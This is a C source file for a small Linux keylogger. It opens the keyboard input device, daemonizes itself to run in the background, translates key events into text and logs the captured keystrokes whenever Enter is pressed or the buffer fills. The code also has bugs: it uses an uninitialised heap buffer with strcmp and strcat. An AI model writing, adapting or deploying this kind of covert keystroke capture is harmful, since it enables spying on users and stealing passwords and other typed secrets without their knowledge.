#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <linux/input.h>
#include <string.h>

#include "logger.h"
#include "keyboard.h"

int main(void) {
  const char *dev = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";

  ssize_t n;
  int fd;
  fd = open(dev, O_RDONLY);
  if (fd == -1) return EXIT_FAILURE;

  daemon(1, 1); // deamonize

  char *phrase = malloc(300);

  struct input_event ev;
  while (strcmp(phrase, "stop") != 0) {
    n = read(fd, &ev, sizeof ev);
    if (n == (ssize_t) -1)
      if (errno == EINTR) continue;
      else break;
    else if (n != sizeof ev) {
        errno = EIO;
        break;
      }

    if (ev.type == EV_KEY && (ev.value == 1 || ev.value == 0))
      strcat(phrase, translateCode(ev.code, ev.value));

    if (strlen(phrase) > 250 || ev.code == KEY_ENTER) {
      LOG_PRINT(phrase);
      memset(phrase, 0, 300);
    }

  }
  free(phrase);
  close(fd);
  fflush(stdout);
  return EXIT_FAILURE;
}
